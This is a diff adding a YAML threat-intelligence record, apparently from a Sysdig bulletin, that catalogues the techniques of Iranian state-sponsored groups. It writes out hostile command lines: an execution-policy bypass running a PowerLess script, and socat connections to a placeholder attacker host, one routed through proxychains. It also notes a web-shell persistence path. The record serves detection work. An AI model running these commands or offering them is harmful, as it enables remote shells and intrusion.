@@ -1,0 +1,45 @@
+description: Following the June 22, 2025 United States strikes on Iranian nuclear
+  infrastructure, Sysdig Threat Research Team anticipates a spike in cyber activities
+  by Iranian state-sponsored advanced persistent threats (APTs) and pro-Iranian hacktivists.
+  This bulletin provides forward-looking guidance, threat intelligence, and detections
+  for security teams.
+attribution: Iranian APTs
+malware_families:
+- PowerLess
+- BellaCiao
+- Tickler
+authors:
+- Michael Clark
+TTPs:
+  processes:
+  - powershell.exe
+  - socat
+  - proxychains
+  - Havoc
+  - MeshCentral
+  commandline:
+  - powershell.exe -ExecutionPolicy Bypass -File C:\Windows\Temp\PowerLess.ps1
+  - socat TCP:attacker_ip:443 STDIO
+  - proxychains socat tcp:attacker_ip:443 stdio
+  powershell:
+  - C:\Windows\Temp\PowerLess.ps1
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - executable: socat
+    destination_address: attacker_ip
+    port: '443'
+  - executable: proxychains
+    destination_address: attacker_ip
+    port: '443'
+  file_activity:
+  - C:\Windows\Temp\PowerLess.ps1
+  persistence:
+  - Web shells deeply buried (e.g., /var/vpn/themes/imgs/) to survive reboots and
+    updates.
+  pipes: []
+  process_relations: []
+IOCs: []
+reference: https://sysdig.com/blog/sysdig-threat-bulletin-iranian-cyber-threats/
+date_of_publication: June 23, 2025
+file_creation_date: June 23, 2025
